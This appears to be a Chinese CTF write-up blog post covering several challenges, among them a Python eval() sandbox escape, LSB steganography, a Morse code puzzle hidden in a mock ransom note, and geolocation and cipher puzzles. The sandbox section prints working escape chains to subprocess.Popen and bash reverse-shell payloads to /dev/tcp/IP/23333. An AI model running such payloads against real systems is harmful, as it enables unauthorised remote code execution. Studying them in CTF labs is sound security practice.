<h3 id="I’m-not-a-robot"><a href="#I’m-not-a-robot" class="headerlink" title="I’m not a robot"></a>I’m not a robot</h3><p>验证码题，之前比赛其实出现过，但是因为看不懂就摸鱼了，现在又出来了，不得已暴露自己比赛摸鱼的事实。其实五百道四则运算题用不了多久，折腾两个小时说不定就搞定了（如果黑心出题人真的肯给flag），除此之外可以试试JWT与图像识别，图像识别用python的库好像出不来，也许要依靠字符匹配？我通过攻击eval拿到了flag</p>
<h4 id="Python沙箱逃逸"><a href="#Python沙箱逃逸" class="headerlink" title="Python沙箱逃逸"></a>Python沙箱逃逸</h4><p>输入框允许输入’&#x2F;‘，而输入’+’与’*’会报过滤，但其实’-‘也是可以的，直接输入一个裸的减号会出现报错，裸除号也会，上网查阅一下资料：<a class="link"   href="https://blog.csdn.net/qq_44214671/article/details/107754513" >SyntaxError:unexpected EOF while parsing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>可以得到两个信息，减号也可以直接输入让后台做运算，和除号一样；后台大概率使用了 <code>eval()</code> 函数，如果输入的是非法的python表达式就会回显错误，而且是语法错误（可以试试输入字母），这也是后台处理除号和减号运算的原理。既然使用了 <code>eval()</code> 函数并给了我们输入代码的能力，那我们就可以考虑通过攻击这个 <code>eval()</code> 达到任意代码执行（RCE）的目的。</p>
<p>然而python的沙箱逃逸需要大量的前置知识做铺垫。</p>
<p>先用几串payload试探一下情况：</p>
<p><code>dir(__builtins__)</code>，可以看到内置命名空间的可控情况：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539188.png"
                     
                ></p>
<p><code>eval exec import system open</code>，可以看到几个重要函数的过滤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539193.png"
                     
                ></p>
<p><code>&quot;&quot;.__class__.__mro__</code>，会发现类不做显示，对参数查找造成一定阻力：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539198.png"
                     
                ></p>
<p><code>dir()</code>，查看当前环境下的变量与导入模块：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539204.png"
                     
                ></p>
<p><code>__builtins__</code>，字典化内置命名空间的属性：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539214.png"
                     
                ></p>
<p><code>[].__class__.__bases__[0].__subclasses__()</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539219.png"
                     
                ></p>
<p><code>picDir</code>：</p>
<p>因为import惨遭过滤，各种绕过都实现不了，所以只能利用python的奇妙继承关系与魔术方法获得一个万能基类 <em>object</em> 来得到一些敏感函数，比如 <code>subprocess.Popen</code></p>
<p>先在自己的电脑上测试，<code>&lt;class &#39;object&#39;&gt;</code> 中没有 <code>&lt;class &#39;os.system&#39;&gt;</code> 类，但是有 <code>&lt;class &#39;subprocess.Popen&#39;&gt;</code> ；利用调用链 <code>[].__class__.__bases__[0]</code> 可得到 <em>object</em> ，但是回显中是不会显示 <code>&lt;class &#39;type&#39;&gt;</code> 这类值的，所以只能用 <code>[].__class__.__bases__[0].__subclasses__()[-1].__name__</code> 逐个尝试它的名字…那当然不行，鬼知道里面有几个类，利用<strong>列表生成式</strong>构造如下表达式去显示 <code>__name__</code> 属性：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">b=[x.__name__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()];</span><br></pre></td></tr></table></figure></div>

<p>然后以超快的手速CACV将列表复制下来，搜索 <code>Popen</code> ，发现确实存在后丢到python中，用</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">c=<span class="built_in">list</span>[...]</span><br><span class="line"><span class="built_in">print</span>(c.index(<span class="string">&#x27;Popen&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<p>得到下标为227，于是我们就得到 <code>subprocess.Popen()</code> 函数了，<code>[].__class__.__bases__[0].__subclasses__()[227]</code> 。构造payload：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">227</span>]([<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/IP/23333 &lt;&amp;1&#x27;</span>])</span><br></pre></td></tr></table></figure></div>

<p>接下来弹个shell到自己服务器上就大功告成了。</p>
<ul>
<li><p><code>__class__</code> 返回一个对象的类，也就是实例的模板，python里一切皆对象；</p>
</li>
<li><p><code>dir()</code> 直接显示当前环境的变量、方法和定义的类型列表、模块；<code>dir(obj)</code> 带参数时返回对象的所有方法、属性列表，如果参数包含方法 <code>__dir__()</code> 则调用该方法</p>
</li>
<li><p><code>__mro__</code> 返回类的所有父类以及继承顺序，’object’ 在最右侧；<code>__bases__</code> 显示所有父类，’object’ 在最左侧；</p>
</li>
<li><p><code>__dict__</code> 以字典形式存储类中的属性（包括方法），可以从 <code>dir()</code> 中获取相应属性字符串，再用 <code>__dict__[&#39;name&#39;]</code> 调用</p>
</li>
<li><p><code>__subclasses__()</code> 表示引用的所有子类</p>
</li>
<li><p>在’python3’中可以通过 <code>&quot;&quot;.__class__.__mro__[1]</code> 来获取’object’对象</p>
</li>
<li><p>在’python3’中所有的类默认继承自 Object 类，继承 object 的全部方法。’python2’中类默认为 “classobj” ，只有 <code>[&#39;__doc__&#39;, &#39;__module__&#39;]</code> 两个方法</p>
</li>
<li><p>python3 最大（内置）名称空间：”builtins” 和 <code>__builtins__</code> ，后者不需要导入</p>
</li>
<li><p>当返回内容为 <code>&lt;class &#39;type&#39;&gt;</code> 时，不知道如何用值去匹配，所以列表难以索引，只能逐个用 <code>__name__</code> 属性去匹配，如 <code>&lt;class &#39;subprocess.Popen&#39;&gt;.__name__</code> 的值为”Popen”；</p>
</li>
</ul>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://www.anquanke.com/post/id/188172" >SSTI&#x2F;沙盒逃逸详细总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_43390703/article/details/106231154" >各种姿势解析-Python沙箱逃逸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.freebuf.com/articles/system/203208.html" >一文看懂Python沙箱逃逸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_39795292/article/details/110773931" >Python绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/9178" >Python沙箱逃逸总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/h0cksr/p/16189741.html" >h0cksr-Python沙箱逃逸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.zhihu.com/question/414045334/answer/1625710674" >Ncat与Netcat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/ddzc/p/12382534.html" >subprocess.Popen <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_39628945/article/details/110269774" >Python连接字符串 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.runoob.com/python/python-func-eval.html" >Python eval()函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>因为之前重装了服务器，用命令 <code>yum -y install nc</code> 安装一下nc，然后先挂起nc的监听：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure></div>

<p><code>-l</code> 表示监听，<code>-v</code> 输出nc的相关信息，<code>-p</code> 表示指定端口，<code>-n</code> 表示直接使用IP地址，而不通过域名服务器；然后在本地开wsl尝试发送ls数据：<code>ls &gt; /dev/tcp/IP/233</code> ，结果没有成功，本地能ping通服务器，但是用 <code>telnet IP port</code> 测试会发现无法建立连接，腾讯云的防火墙已经开了，但是尝试反弹shell会出现报错：<a class="link"   href="https://blog.csdn.net/Zxiaobinggan/article/details/109093480" >“没有找到主机的路由 (Host unreachable)” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，用 <code>systemctl status firewalld</code> 检查防火墙会发现处于开启状态(用 <code>sudo fire-cmd --state</code> 也行)，先用 <code>service firewalld stop</code> 关闭服务，重新监听端口后再尝试弹shell，这一次成功得到目录。</p>
<p>一般的反弹shell语句为：<code>bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1</code> 表示创建一个交互shell，并将输入输出都转移到目标服务器上，也可以不使用 <code>bash -i</code> ，而是将具体命令行的结果发送过去 <code>ls &gt; /dev/tcp/IP/port</code>。</p>
<p>顺便提一嘴，Ncat和Netcat其实是两个东西，后者已经不再更新，且功能上基本被前者完全替代，电脑上装有Ncat的情况下nc命令默认使用Ncat</p>
<p>接下来尝试反弹shell，先尝试payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[].__class__.__bases__[0].__subclasses__()[227](<span class="string">&#x27;ls &gt;&amp; /dev/tcp/IP/23333&#x27;</span>,shell=<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></div>

<p>但是目标主机没反应，换一个payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[].__class__.__bases__[0].__subclasses__()[227]([<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;ls &gt;&amp; /dev/tcp/IP/23333&#x27;</span>])</span><br></pre></td></tr></table></figure></div>

<p>发现成功了，这是因为 <code>shell=true</code> 相当于在命令前面加上 <code>/bin/sh -c</code> 表示用sh来执行命令，很不巧的是sh不支持 <code>/dev/tcp</code> ，这是bash专属的；而如果不带shell参数，则要传入一个命令列表，其中第一项需要是一个可访问的文件，调用bash执行命令即可，参考：<a class="link"   href="https://www.jianshu.com/p/9d4e4cf06d23" >python-subprocess.Popen的使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>其次这里也无法使用 <code>chsh -s /bin/bash</code> 来切换shell，一方面是默认shell就不一定是sh，另一方面是该命令需要sudo，而不需要sudo的 <code>chsh</code> 是交互。<code>bash -c</code> 可以用bash执行接下来的命令</p>
<p>最后用grep命令找出flag即可…也不即可，黑心出题人的flag虽然确实在当前文件夹下，但是改了个前缀变成了 “r0v0t”，还好同一个文件夹下有好几个r00t{}格式的flag，翻一翻就能看到那可爱的”r0v0t”</p>
<p>最后要看懂沙箱逃逸所需要的时间是老实算验证码的不知道多少倍，我的评价是不如直接算验证码，珍惜头发</p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/qq_45584159/article/details/111489653?utm_source=app&app_version=5.3.1&utm_source=app" >走在路上的小白鼠-常见的反弹shell方法及解释 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>flag字体颜色与背景一致，高光选中（Ctrl+A）或者直接翻源码都能找到。这题我也看了好久来着&#x3D; &#x3D;</p>
<h3 id="strange-LSB-strange-Significant-Bit"><a href="#strange-LSB-strange-Significant-Bit" class="headerlink" title="strange LSB -&gt; strange ? Significant Bit"></a>strange LSB -&gt; strange ? Significant Bit</h3><p>暴打pyy的题目，如果这题划成分，那我觉得成分里全是氵，只有一滴是LSB，那一滴还是骗人的。。。首先拿到题目，说是LSB，那就丢进steg里找找，找到了小半个flag…</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539239.bmp"
                     
                ><br>然后呢，然后啥都没有，把各个位数上的图片拿出来叠加也没有结果，于是就想给出的flag可能提示了图片的出处，付费（-36）的提示说是社工，好，那一定是上网搜图找地儿了吧，于是就搜啊搜，看着一个”Ma”找马达加斯加、找玛格丽特河，试一试名字行不行，毕竟flag不能直接给那就只能是这些现成的单词，结果一个都不对…然后新提示来了，看看出题人的qq，行，瞅一眼，哇哦，居然有这张图，感情是自己整的，那难道是qq信息里有什么地名提示？搜罗一番还是莫得（沉迷地名无法自拔），再看群里，出题人说要用到手机。。。我就上手机一看，发现电脑上拿不下来的背景图手机上拿的下来，我想直接找LSB隐写就行了吧，然后什么都没有。。。于是就把下载下来的和空间找到的两张图叠图异或，然后找到了flag。然后提（pan）询（wen）出题人思路是什么，出题人表示：图像处理有点小难，所以加了个困难标签，合情合理。最后拿到了图像处理的源码，一份是”insertFlag.py”：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">lsb=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="comment">#读取图像</span></span><br><span class="line">  flagImg=cv2.imread(<span class="string">&quot;flag.png&quot;</span>,<span class="number">0</span>)<span class="comment">#黑白</span></span><br><span class="line">  sourceImg=cv2.imread(<span class="string">&quot;qq.jpg&quot;</span>,<span class="number">1</span>)<span class="comment">#彩色</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#使生成的flag在图像的中间</span></span><br><span class="line">  startPoint=[(sourceImg.shape[<span class="number">0</span>]-flagImg.shape[<span class="number">0</span>])//<span class="number">2</span>,(sourceImg.shape[<span class="number">1</span>]-flagImg.shape[<span class="number">1</span>])//<span class="number">2</span>]</span><br><span class="line">  <span class="built_in">print</span>(flagImg.shape, sourceImg.shape, startPoint)</span><br><span class="line">  <span class="keyword">for</span> y,x <span class="keyword">in</span> product(<span class="built_in">range</span>(flagImg.shape[<span class="number">0</span>]),<span class="built_in">range</span>(flagImg.shape[<span class="number">1</span>])):</span><br><span class="line">    <span class="comment">#如果flag图像上这个像素是黑色的, 那就把原图的这个点的所有像素值-1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flagImg[y,x]&lt;<span class="number">255</span>:</span><br><span class="line">      <span class="keyword">if</span> x&lt;<span class="number">200</span>: <span class="comment"># 200个像素宽的左半部分变化明显，将最后一位置为0（黑色），因此查看各通道最后一位时可见黑色的部分flag</span></span><br><span class="line">        sourceImg[y+startPoint[<span class="number">0</span>],x+startPoint[<span class="number">1</span>]]=sourceImg[y+startPoint[<span class="number">0</span>],x+startPoint[<span class="number">1</span>]]&amp;(~lsb)    <span class="comment"># ~lsb = 11111110 </span></span><br><span class="line">      <span class="keyword">else</span>: <span class="comment"># 右半部分做只对最低有效位进行的异或，因此需要异或叠图，并且由于异或出来的像素值很小，得到的图非常暗淡</span></span><br><span class="line">        sourceImg[y+startPoint[<span class="number">0</span>],x+startPoint[<span class="number">1</span>]]=sourceImg[y+startPoint[<span class="number">0</span>],x+startPoint[<span class="number">1</span>]]^lsb</span><br><span class="line">      </span><br><span class="line">  <span class="comment">#写出图像</span></span><br><span class="line">  cv2.imwrite(<span class="string">&quot;out.png&quot;</span>,sourceImg)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>和”getFlag.py”：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> insertFlag <span class="keyword">import</span> lsb</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  flagImg=cv2.imread(<span class="string">&quot;out.png&quot;</span>,<span class="number">1</span>)</span><br><span class="line">  sourceImg=cv2.imread(<span class="string">&quot;qq.jpg&quot;</span>,<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">for</span> y,x <span class="keyword">in</span> product(<span class="built_in">range</span>(flagImg.shape[<span class="number">0</span>]),<span class="built_in">range</span>(flagImg.shape[<span class="number">1</span>])):</span><br><span class="line">    <span class="keyword">if</span> (flagImg[y,x]-sourceImg[y,x]&lt;lsb).<span class="built_in">all</span>():</span><br><span class="line">      flagImg[y,x]=np.full((<span class="number">3</span>),<span class="number">255</span>,np.uint8)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      flagImg[y,x]=np.full((<span class="number">3</span>),<span class="number">0</span>,np.uint8)</span><br><span class="line">  cv2.imwrite(<span class="string">&quot;ans.png&quot;</span>,flagImg)</span><br></pre></td></tr></table></figure></div>

<p>这里用到了一个”insertFlag”的python组件，然鹅我看的也不是很懂。总之利用”stegSolve”的叠图运算可以解决，甚至比处理出来的还清楚（?）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539244.bmp"
                     
                ></p>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_34075268/article/details/88744599" >Lsb图片隐写 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="骗！偷袭！绑架勒索！【任务B：情报收集】"><a href="#骗！偷袭！绑架勒索！【任务B：情报收集】" class="headerlink" title="骗！偷袭！绑架勒索！【任务B：情报收集】"></a>骗！偷袭！绑架勒索！【任务B：情报收集】</h3><p>一道很有趣的题，下下来一个.mht文件，是一封邮件，它会提示你用IE打开，但实际上它可以以文本格式打开，里面有最全面的信息，包括邮件的格式，虽然发件人仍然被隐藏了，但是会找到一串用Base64加密过的信息：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gV2FubmFFc2NhcGUg</span><br><span class="line">djEuMDAgYnkgWkhBTkdTQU4sIDIwMjItMDMtMzEgLS0+DQo8V2FubmFFc2NhcGU+DQoJPGVtYWls</span><br><span class="line">PmV6Zm9yZXZlckByMDB0ZWFtLmNjPC9lbWFpbD4NCgk8aW5mZWN0ZWQ+MjAyMi0wNC0wMVQwNjoy</span><br><span class="line">NToyMi4wMDBaPC9pbmZlY3RlZD4NCjwvV2FubmFFc2NhcGU+</span><br></pre></td></tr></table></figure></div>

<p>解密后的内容是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!-- WannaEscape v1.00 by ZHANGSAN, 2022-03-31 --&gt;</span><br><span class="line">&lt;WannaEscape&gt;</span><br><span class="line">	&lt;email&gt;ezforever@r00team.cc&lt;/email&gt;</span><br><span class="line">	&lt;infected&gt;2022-04-01T06:25:22.000Z&lt;/infected&gt;</span><br><span class="line">&lt;/WannaEscape&gt;</span><br></pre></td></tr></table></figure></div>

<p>我第一次还没看到，后来又绕回了这里才发现有一个”by ZHANGSAN”，注意这题直接交人名作为答案即可，不需要包上flag格式。起初我是以为这题要得到文件本体或者真的发送邮件到某个地址，从回信中得到人名的，结果发现里面的所有邮件信息，除了Ezforever的，都是伪造的。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spaces</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">=_NextPart_SMP_1d844a4b687fc8d_52122bf1_00000001</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1100 0010 1010 0000</span><br><span class="line">C2 A0</span><br><span class="line">64+2+1 67 C</span><br><span class="line">5</span><br></pre></td></tr></table></figure></div>

<h3 id="FlaggyBird"><a href="#FlaggyBird" class="headerlink" title="FlaggyBird"></a>FlaggyBird</h3><p>菜就多练练，游戏题怎么可以不打游戏呢</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539266.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539299.png"
                     
                ></p>
<p>或者也可以不打游戏，试着用 <a class="link"   href="http://c.biancheng.net/view/2690.html" >pyinstall <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 处理这个python小游戏，可以借助010editor浏览游戏文件的文件内容，判断文件类型</p>
<p>下载一个<a class="link"   href="https://github.com/extremecoders-re/pyinstxtractor" >“pyinstxtractor-master” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，将这个用python写的小游戏解压，然后如果用windows系统，就装一个<a class="link"   href="https://blog.csdn.net/mainmaster/article/details/122995603" >“grep for windows” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，在命令行输入 <code>grep r00t -r  flaggybird.exe_extracted </code> ，搜索文件夹中存在关键字的地方，然后再在响应文件夹下输入 <code>strings flyppybird.pyc | grep -a r00t</code> ，<code>|</code> 表示管道，左边是输入，右边是根据左边的输入得到相应输出，<code>strings</code> 将二进制文件转化为文本，<code>-a</code> 强行显示文本内容，最后得到flag。如果命令出错：<code>strings flyppybird.pyc | grep -a r00t flyppybird.pyc</code> 导致有文件挤占管道的输入会出现报错：<code>no space left on device</code> </p>
<h3 id="所以这红桩子到底是什么！？"><a href="#所以这红桩子到底是什么！？" class="headerlink" title="所以这红桩子到底是什么！？"></a>所以这红桩子到底是什么！？</h3><p>提起舟山，我一个学过地理的浙江人第一反应居然是杭州…地点在浙江省宁波舟山市，flag是地点名，关键信息是学校旁边有条河，河对面有个码头，看图这条河挺宽，右边还有很多小岛，所以flag格式才会那么丰富，有岛湖礁。打开手机版的腾讯地图搜索舟山市码头，找找看在内河旁边的码头有几个，三江客运中心是，但河对面没有学校，而且这条河是内河，地图上没看到有岛礁，外侧那条宽的不知道称不称的上是河的水路对面是一座小岛，也找不到学校的影子；看完这个我就想到这条宽阔有岛礁的河可能不是内河，在主岛上浏览一遍水路的周侧，基本都很窄，而且对面没有学校，看起来也不像是有岛礁的样子，所以可以考虑这条所谓的河是环岛外侧的河，而不是岛内的河。再搜索”舟山市码头 学校”，跳出来的是墩头码头，很可惜对面没有学校；既然学校这么难找，那就直接搜索”舟山市学校”，其中位于岛外侧且对面或附近有岛礁的有沈家门中学、浙江大学一片与浙江海洋大学长峙校区，我直接就看浙江大学去了，为了比对风景先切换到卫星地图，校区离这条河不远，往对岸看的话右侧确实有一片岛礁，放大以后细看会看到一个吐出来的红色区域，可能是集装箱，所以应该有码头，但是地图上一开始不显示，拉到最大才会看见一个”王家墩码头”，基本符合的情况下找找红桩子，刚好从图中的视角来看集装箱的左后方有一块很模糊的深色陆地，所以很可能是，但是卫星地图下没有任何地名，切换回标准地图后会发现这块地方是”玉秃礁”，试了试发现就对了，所以就是这里。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539318.png"
                     
                ></p>
<p>做完以后再来分析一下这题的提示，这条朋友圈的语气像是新生入学，所以大学的可能性很大；另一方面”王家墩码头”搜索”舟山市码头”是不会显示的，但是直接搜索”码头”它会显示一个小红点，这应该是关键词的问题。最后如果可以试着搜索一下关键字”舟山市码头 学校”，它会导向”舟山壹号码头餐厅”，放大后会找到”王家墩码头”，对面有小学和大学，刚好是符合条件的，但我一开始没明白这个关键词为什么会导到这里，后来想想可能是因为大学生经常出入这一块，所以关联性比较强。</p>
<h3 id="骗！偷袭！绑架勒索！"><a href="#骗！偷袭！绑架勒索！" class="headerlink" title="骗！偷袭！绑架勒索！"></a>骗！偷袭！绑架勒索！</h3><p>文件提示里只有一个特殊字符：<code>C2 A0</code> ，是”non-breaking space”，能保证不被压缩长度（很多空白字符连续在某些环境会被压缩）并保证两侧的文字处在同一行，常用于排版，会写成 <code>&amp;nbsp</code> ；恰巧题目又提示我们回去看那封勒索信，在下方的段落中看到 <code>&lt;i&gt;</code> 标记的几个字母拼接出的英文：”spaces”。显然是要我们注意 <code>&amp;nbsp</code> 。打开010editor一看，确实有很多C2A0，但是一时看不出什么规律，拖进VSC会发现VSC自动将这些非常规空格标记了出来。接下来的问题在于加密的方法到底是什么，考虑到flag是一串英文，我第一想法是藏头或者组合字母拼接英文，但很可惜这个思路怎么也行不通，后来想到 <code>&amp;nbsp</code> 的作用，又试着将这些不换行的地方强行换行了一下，但也没找到什么东西。结果这居然是摩尔斯电码</p>
<p>为什么这也能整成摩尔斯电码…确实有点抽象，特殊空格为长，正常空格为短，一行取一个字母。用摩尔斯电码来解读确实很好的解释了为什么这封邮件有这么奇怪的换行排版，以及密文为什么非得分到三块内容中去写，而不是简单的集成在某一部分</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your-important files-are 		-.-  k</span><br><span class="line">encrypted.-Many-of-your			---  o</span><br><span class="line">documents, photos,-videos		.-   a</span><br><span class="line">and other-files are no			.-.. l</span><br><span class="line">longer accessible because		..   i</span><br><span class="line">they-have-been					--   m</span><br><span class="line">encrypted. You-can				.-   a</span><br><span class="line">verify-this by trying			-..  d</span><br><span class="line">to open							.	 e</span><br><span class="line">them.-Maybe-you					--	 m</span><br><span class="line">are looking						.	 e</span><br><span class="line">for-a way to					-..  d</span><br><span class="line">recover-your-files,-but			---  o</span><br><span class="line">do-not							-	 t</span><br><span class="line">waste your time. Nobody can		.... h</span><br><span class="line">recover your files				..	 i</span><br><span class="line">without our decryption service.	...	 s</span><br><span class="line"></span><br><span class="line">We guarantee that				..	 i</span><br><span class="line">you can recover all-your		...- v</span><br><span class="line">files safely					.	 e</span><br><span class="line">and-easily. But you need		-... b</span><br><span class="line">to pay,							.	 e</span><br><span class="line">and you							.	 e</span><br><span class="line">only-have 3						-.   n</span><br><span class="line">days to-submit					.-   a</span><br><span class="line">the-payment. After that the		-... b</span><br><span class="line">price-will be doubled.			-..	 d</span><br><span class="line">Also, if you-don&#x27;t				..-  u</span><br><span class="line">pay-in 7-days, you 				-.-. c</span><br><span class="line">won&#x27;t-be						-	 t</span><br><span class="line">able to							.	 e</span><br><span class="line">recover-your files forever.		-..	 d</span><br><span class="line"></span><br><span class="line">Payment is accepted in			...  s</span><br><span class="line">Dogecoin only.					.	 e</span><br><span class="line">Please-check the				-.	 n</span><br><span class="line">current-price and buy			-..	 d</span><br><span class="line">some Dogecoins, then send the	.... h</span><br><span class="line">correct amount					.	 e</span><br><span class="line">to the-address specified below	.-.. l</span><br><span class="line">Contact us-for-more information .--. p</span><br><span class="line"></span><br><span class="line">koali made me do this i ve been abducted(劫持) send help</span><br></pre></td></tr></table></figure></div>

<p>说人话就是koali绑架了我，我被劫持了，发出求救信号（koali风评被害）</p>
<p>说实话就是我真没想到摩尔斯电码能这样解，一开始我看着空格的位置也考虑了一下摩尔斯电码，但没想明白长短如何分配，而且前面的 <code>spaces</code> 的提示是单词拆出字母组合而成的，所以我一直觉得是由 <code>&amp;nbsp</code> 附近的单词组合字母得到flag，毕竟这个特殊字符最大的意义就是控制不换行，那不换行总该是一个提示吧，结果真不是…</p>
<h3 id="第八号当铺"><a href="#第八号当铺" class="headerlink" title="第八号当铺"></a>第八号当铺</h3><p>众所周知，misc人称小密码学，下载文件的名称就提示了这是个jpg文件，或者查看二进制数据也可以通过文件头确认是jpg文件，修改后缀打开图片，是一串由工田balabala。</p>
<p>网上搜由工田，会发现这题是<a class="link"   href="https://www.cnblogs.com/Clair-is-com/p/16191740.html" >当铺密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，出头几划就是数字几：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">114 48 48 116 123 100 111 110 116 95 112 97 119 110 95 121 111 117 114 95 108 105 102 101 125 </span><br></pre></td></tr></table></figure></div>

<p>将数字转换成相应字母即可得到flag：</p>
